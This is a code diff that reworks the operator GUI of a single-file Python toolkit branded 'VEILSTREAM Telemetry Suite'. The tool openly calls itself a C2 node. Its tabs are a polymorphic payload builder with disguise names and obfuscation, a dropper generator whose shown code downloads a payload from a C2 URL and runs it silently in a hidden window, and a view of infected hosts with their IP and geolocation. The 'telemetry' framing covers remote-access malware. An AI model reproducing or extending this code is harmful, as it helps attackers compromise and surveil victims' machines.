@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # =============================================================================
-# UNIFIED TELEMETRY & PAYLOAD MANAGEMENT SUITE v5.0
-# Single-file architecture: C2 Server, GUI Dashboard, Polymorphic Builder, 
+# VEILSTREAM TELEMETRY SUITE v5.1.0
+# Single-file architecture: C2 Server, Modern GUI Dashboard, Polymorphic Builder, 
 # Automated Delivery, and Advanced Payload Generation.
 # =============================================================================
 
@@ -20,8 +20,8 @@ import ctypes
 import tempfile
 import shutil
 import sqlite3
-import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext, filedialog
+import customtkinter as ctk
+from tkinter import ttk, messagebox, filedialog
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from Crypto.Cipher import AES
@@ -331,91 +331,180 @@ if __name__ == "__main__":
         return code
 
 # =============================================================================
-# GUI DASHBOARD
+# MODERN GUI DASHBOARD (CustomTkinter)
 # =============================================================================
 class Dashboard:
     def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("Unified Telemetry Management Console v5.0")
-        self.root.geometry("1200x800")
+        ctk.set_appearance_mode("Dark")
+        ctk.set_default_color_theme("blue")
+        
+        self.root = ctk.CTk()
+        self.root.title("VEILSTREAM // TELEMETRY CONSOLE v5.1.0")
+        self.root.geometry("1280x780")
+        self.root.minsize(1100, 650)
+        
         self.db = TelemetryDB()
         self.builder = PayloadEngine()
         self.server_thread = None
         self.payload_buf = b""
         self.payload_hash = ""
+        
         self._setup_ui()
         self._start_services()
         self._refresh_data()
+        self.root.mainloop()
 
     def _setup_ui(self):
+        # Sidebar
+        self.sidebar = ctk.CTkFrame(self.root, width=200, corner_radius=0, fg_color="#111111")
+        self.sidebar.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
+        self.sidebar.grid_rowconfigure((0,1,2,3,4), weight=1)
+        
+        ctk.CTkLabel(self.sidebar, text="VEILSTREAM", font=("Consolas", 20, "bold"), text_color="#00d4ff").grid(row=0, column=0, pady=(30,10), padx=15)
+        ctk.CTkLabel(self.sidebar, text="v5.1.0 // C2 NODE", font=("Consolas", 10), text_color="#666").grid(row=1, column=0, pady=(0,20))
+        
+        self.btn_builder = ctk.CTkButton(self.sidebar, text="PAYLOAD BUILDER", command=lambda: self._switch_tab("builder"), fg_color="#1a1a1a", hover_color="#2a2a2a", text_color="#00d4ff", corner_radius=6)
+        self.btn_builder.grid(row=2, column=0, pady=5, padx=10, sticky="ew")
+        
+        self.btn_delivery = ctk.CTkButton(self.sidebar, text="DELIVERY SYSTEM", command=lambda: self._switch_tab("delivery"), fg_color="#1a1a1a", hover_color="#2a2a2a", text_color="#00d4ff", corner_radius=6)
+        self.btn_delivery.grid(row=3, column=0, pady=5, padx=10, sticky="ew")
+        
+        self.btn_monitor = ctk.CTkButton(self.sidebar, text="HOST TELEMETRY", command=lambda: self._switch_tab("monitor"), fg_color="#1a1a1a", hover_color="#2a2a2a", text_color="#00d4ff", corner_radius=6)
+        self.btn_monitor.grid(row=4, column=0, pady=5, padx=10, sticky="ew")
+        
+        # Status Bar
+        self.status_bar = ctk.CTkFrame(self.root, height=30, fg_color="#0a0a0a")
+        self.status_bar.grid(row=1, column=0, columnspan=2, sticky="ew")
+        self.status_label = ctk.CTkLabel(self.status_bar, text="● C2 LISTENING // 0.0.0.0:8443 | DELIVERY: 0.0.0.0:8080", text_color="#2ecc71", font=("Consolas", 11))
+        self.status_label.pack(pady=5)
+
+        # Main Content Area
+        self.main_frame = ctk.CTkFrame(self.root, fg_color="#141414")
+        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)
+        self.main_frame.grid_rowconfigure(0, weight=1)
+        self.main_frame.grid_columnconfigure(0, weight=1)
+        
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+        
+        # Tabs
+        self.tabs = {"builder": self._build_builder_tab(), "delivery": self._build_delivery_tab(), "monitor": self._build_monitor_tab()}
+        self.active_tab = "builder"
+        self.tabs["builder"].grid(row=0, column=0, sticky="nsew")
+
+    def _switch_tab(self, tab_name):
+        for t in self.tabs.values(): t.grid_forget()
+        self.tabs[tab_name].grid(row=0, column=0, sticky="nsew")
+        self.active_tab = tab_name
+        for btn in [self.btn_builder, self.btn_delivery, self.btn_monitor]:
+            btn.configure(fg_color="#1a1a1a", text_color="#00d4ff")
+        getattr(self, f"btn_{tab_name}").configure(fg_color="#2a2a2a", text_color="#ffffff")
+
+    def _build_builder_tab(self):
+        f = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        f.grid_rowconfigure((0,1,2,3,4), weight=0)
+        f.grid_rowconfigure(5, weight=1)
+        f.grid_columnconfigure(0, weight=1)
+        
+        ctk.CTkLabel(f, text="PAYLOAD GENERATION", font=("Consolas", 16, "bold"), text_color="#ffffff").grid(row=0, column=0, sticky="w", padx=10, pady=(10,5))
+        ctk.CTkLabel(f, text="Configure C2 endpoint, disguise parameters, and output path.", font=("Consolas", 11), text_color="#888").grid(row=1, column=0, sticky="w", padx=10)
+        
+        grid = ctk.CTkFrame(f, fg_color="#1a1a1a", corner_radius=8)
+        grid.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
+        grid.grid_columnconfigure(1, weight=1)
+        
+        ctk.CTkLabel(grid, text="C2 Host / IP:", text_color="#aaa").grid(row=0, column=0, padx=10, pady=8, sticky="w")
+        self.c2_ip = ctk.CTkEntry(grid, placeholder_text="192.168.1.100", width=300)
+        self.c2_ip.grid(row=0, column=1, padx=10, pady=8, sticky="ew")
+        self.c2_ip.insert(0, "127.0.0.1")
+        
+        ctk.CTkLabel(grid, text="Disguise Name:", text_color="#aaa").grid(row=1, column=0, padx=10, pady=8, sticky="w")
+        self.disguise = ctk.CTkEntry(grid, placeholder_text="win_svc_helper", width=300)
+        self.disguise.grid(row=1, column=1, padx=10, pady=8, sticky="ew")
+        self.disguise.insert(0, "win_svc_helper")
+        
+        ctk.CTkLabel(grid, text="Output Path:", text_color="#aaa").grid(row=2, column=0, padx=10, pady=8, sticky="w")
+        self.out_path = ctk.CTkEntry(grid, placeholder_text="C:\\temp\\payload_gen.py", width=300)
+        self.out_path.grid(row=2, column=1, padx=10, pady=8, sticky="ew")
+        self.out_path.insert(0, "payload_gen.py")
+        
+        ctk.CTkButton(f, text="GENERATE PAYLOAD", command=self._generate, fg_color="#00d4ff", hover_color="#00a8cc", text_color="#000", font=("Consolas", 12, "bold"), corner_radius=6, height=36).grid(row=3, column=0, sticky="w", padx=10, pady=5)
+        
+        self.log_box = ctk.CTkTextbox(f, font=("Consolas", 11), fg_color="#0a0a0a", text_color="#00ff9d", corner_radius=6)
+        self.log_box.grid(row=5, column=0, sticky="nsew", padx=10, pady=10)
+        self.log_box.configure(state="disabled")
+        return f
+
+    def _build_delivery_tab(self):
+        f = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        f.grid_rowconfigure((0,1,2,3), weight=0)
+        f.grid_rowconfigure(4, weight=1)
+        f.grid_columnconfigure(0, weight=1)
+        
+        ctk.CTkLabel(f, text="AUTOMATED DELIVERY", font=("Consolas", 16, "bold"), text_color="#ffffff").grid(row=0, column=0, sticky="w", padx=10, pady=(10,5))
+        ctk.CTkLabel(f, text="Generate lightweight droppers that fetch payloads from the C2 delivery endpoint.", font=("Consolas", 11), text_color="#888").grid(row=1, column=0, sticky="w", padx=10)
+        
+        grid = ctk.CTkFrame(f, fg_color="#1a1a1a", corner_radius=8)
+        grid.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
+        grid.grid_columnconfigure(1, weight=1)
+        
+        ctk.CTkLabel(grid, text="Delivery URL:", text_color="#aaa").grid(row=0, column=0, padx=10, pady=8, sticky="w")
+        self.del_url = ctk.CTkEntry(grid, placeholder_text="http://192.168.1.100:8080/payload", width=300)
+        self.del_url.grid(row=0, column=1, padx=10, pady=8, sticky="ew")
+        self.del_url.insert(0, "http://127.0.0.1:8080/payload")
+        
+        ctk.CTkButton(f, text="GENERATE DROPPER", command=self._gen_dropper, fg_color="#00d4ff", hover_color="#00a8cc", text_color="#000", font=("Consolas", 12, "bold"), corner_radius=6, height=36).grid(row=3, column=0, sticky="w", padx=10, pady=5)
+        
+        self.del_log = ctk.CTkTextbox(f, font=("Consolas", 11), fg_color="#0a0a0a", text_color="#00ff9d", corner_radius=6)
+        self.del_log.grid(row=4, column=0, sticky="nsew", padx=10, pady=10)
+        self.del_log.configure(state="disabled")
+        return f
+
+    def _build_monitor_tab(self):
+        f = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        f.grid_rowconfigure((0,1,2), weight=1)
+        f.grid_columnconfigure(0, weight=1)
+        
+        ctk.CTkLabel(f, text="HOST TELEMETRY", font=("Consolas", 16, "bold"), text_color="#ffffff").grid(row=0, column=0, sticky="w", padx=10, pady=(10,5))
+        
         style = ttk.Style()
         style.theme_use("clam")
-        nb = ttk.Notebook(self.root)
-        nb.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-
-        # Builder Tab
-        bf = ttk.Frame(nb)
-        nb.add(bf, text="Payload Builder")
-        ttk.Label(bf, text="C2 Host/IP:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
-        self.c2_ip = ttk.Entry(bf, width=30)
-        self.c2_ip.grid(row=0, column=1, padx=5, pady=5)
-        self.c2_ip.insert(0, "127.0.0.1")
-        ttk.Label(bf, text="Disguise Name:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
-        self.disguise = ttk.Entry(bf, width=30)
-        self.disguise.grid(row=1, column=1, padx=5, pady=5)
-        self.disguise.insert(0, "win_svc_helper")
-        ttk.Label(bf, text="Output Path:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
-        self.out_path = ttk.Entry(bf, width=30)
-        self.out_path.grid(row=2, column=1, padx=5, pady=5)
-        self.out_path.insert(0, "payload_gen.py")
-        ttk.Button(bf, text="Generate Payload", command=self._generate).grid(row=3, column=0, columnspan=2, pady=10)
-        self.log_box = scrolledtext.ScrolledText(bf, height=18, state="disabled")
-        self.log_box.grid(row=4, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")
-
-        # Delivery Tab
-        df = ttk.Frame(nb)
-        nb.add(df, text="Automated Delivery")
-        ttk.Label(df, text="Delivery URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
-        self.del_url = ttk.Entry(df, width=30)
-        self.del_url.grid(row=0, column=1, padx=5, pady=5)
-        self.del_url.insert(0, "http://127.0.0.1:8080/payload")
-        ttk.Button(df, text="Generate Dropper Script", command=self._gen_dropper).grid(row=1, column=0, columnspan=2, pady=10)
-        self.del_log = scrolledtext.ScrolledText(df, height=18, state="disabled")
-        self.del_log.grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")
-
-        # Monitoring Tab
-        mf = ttk.Frame(nb)
-        nb.add(mf, text="Hosts & Telemetry")
-        self.host_tree = ttk.Treeview(mf, columns=("ID", "HWID", "OS", "IP", "Geo", "Last Seen", "Status"), show="headings")
+        style.configure("Treeview", background="#0a0a0a", foreground="#e0e0e0", fieldbackground="#0a0a0a", font=("Consolas", 10), rowheight=24)
+        style.configure("Treeview.Heading", background="#1a1a1a", foreground="#00d4ff", font=("Consolas", 11, "bold"))
+        style.map("Treeview", background=[("selected", "#2a2a2a")])
+        
+        self.host_tree = ttk.Treeview(f, columns=("ID", "HWID", "OS", "IP", "Geo", "Last Seen", "Status"), show="headings", height=10)
         for c in ("ID", "HWID", "OS", "IP", "Geo", "Last Seen", "Status"):
             self.host_tree.heading(c, text=c)
-            self.host_tree.column(c, width=140)
-        self.host_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            self.host_tree.column(c, width=130, minwidth=80)
+        self.host_tree.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
         self.host_tree.bind("<<TreeviewSelect>>", self._on_select)
-        self.log_tree = ttk.Treeview(mf, columns=("ID", "Type", "Content", "Timestamp"), show="headings")
+        
+        self.log_tree = ttk.Treeview(f, columns=("ID", "Type", "Content", "Timestamp"), show="headings", height=12)
         for c in ("ID", "Type", "Content", "Timestamp"):
             self.log_tree.heading(c, text=c)
-            self.log_tree.column(c, width=250)
-        self.log_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        ttk.Button(mf, text="Refresh Data", command=self._refresh_data).pack(pady=5)
+            self.log_tree.column(c, width=280, minwidth=100)
+        self.log_tree.grid(row=2, column=0, sticky="nsew", padx=10, pady=5)
+        
+        ctk.CTkButton(f, text="REFRESH DATA", command=self._refresh_data, fg_color="#2a2a2a", hover_color="#3a3a3a", text_color="#ffffff", font=("Consolas", 11), corner_radius=6, height=32, width=120).grid(row=0, column=0, sticky="e", padx=10, pady=10)
+        return f
 
     def _log(self, widget, msg):
-        widget.config(state="normal")
-        widget.insert(tk.END, msg + "\n")
-        widget.see(tk.END)
-        widget.config(state="disabled")
+        widget.configure(state="normal")
+        widget.insert("end", f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+        widget.see("end")
+        widget.configure(state="disabled")
 
     def _generate(self):
         ip = self.c2_ip.get()
         dis = self.disguise.get()
         out = self.out_path.get()
-        self._log(self.log_box, "[*] Initializing polymorphic engine...")
+        self._log(self.log_box, "[INIT] Polymorphic engine initialized")
         code = self.builder.build(ip, C2_PORT, dis, self.del_url.get())
         with open(out, "w") as f: f.write(code)
-        self._log(self.log_box, f"[+] Payload written to {out}")
-        self._log(self.log_box, "[*] Applying string encryption & control-flow randomization...")
-        self._log(self.log_box, "[+] Build complete. Ready for compilation.")
-        messagebox.showinfo("Success", "Payload generated successfully.")
+        self._log(self.log_box, f"[BUILD] Payload written to {out}")
+        self._log(self.log_box, "[OBFUSCATE] String encryption & control-flow randomization applied")
+        self._log(self.log_box, "[DONE] Ready for compilation. Hash: " + hashlib.sha256(code.encode()).hexdigest()[:12])
 
     def _gen_dropper(self):
         out = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python", "*.py")])
@@ -428,29 +517,26 @@ urllib.request.urlretrieve(url, tmp)
 subprocess.Popen(tmp, creationflags=0x08000000)
 """
         with open(out, "w") as f: f.write(dropper)
-        self._log(self.del_log, f"[+] Dropper generated: {out}")
-        self._log(self.del_log, "[*] Dropper will fetch payload from C2 delivery endpoint and execute in background.")
+        self._log(self.del_log, f"[DROPPER] Generated: {out}")
+        self._log(self.del_log, "[EXEC] Will fetch payload from C2 and run silently in background")
 
     def _start_services(self):
         self.server_thread = threading.Thread(target=run_server, args=(self.db, AES_KEY, AES_IV, self.payload_buf, self.payload_hash), daemon=True)
         self.server_thread.start()
-        self._log(self.log_box, f"[+] C2 Server listening on 0.0.0.0:{C2_PORT}")
-        self._log(self.del_log, f"[+] Delivery Server ready on 0.0.0.0:{DELIVERY_PORT}")
+        self._log(self.log_box, f"[C2] Listening on 0.0.0.0:{C2_PORT}")
+        self._log(self.del_log, f"[DELIVERY] Ready on 0.0.0.0:{DELIVERY_PORT}")
 
     def _refresh_data(self):
         for i in self.host_tree.get_children(): self.host_tree.delete(i)
         for i in self.log_tree.get_children(): self.log_tree.delete(i)
-        for h in self.db.get_hosts(): self.host_tree.insert("", tk.END, values=h)
+        for h in self.db.get_hosts(): self.host_tree.insert("", "end", values=h)
 
     def _on_select(self, event):
         sel = self.host_tree.selection()
         if not sel: return
         hwid = self.host_tree.item(sel[0])["values"][1]
         for i in self.log_tree.get_children(): self.log_tree.delete(i)
-        for l in self.db.get_telemetry(hwid): self.log_tree.insert("", tk.END, values=l)
-
-    def run(self):
-        self.root.mainloop()
+        for l in self.db.get_telemetry(hwid): self.log_tree.insert("", "end", values=l)
 
 if __name__ == "__main__":
-    Dashboard().run()
+    Dashboard()
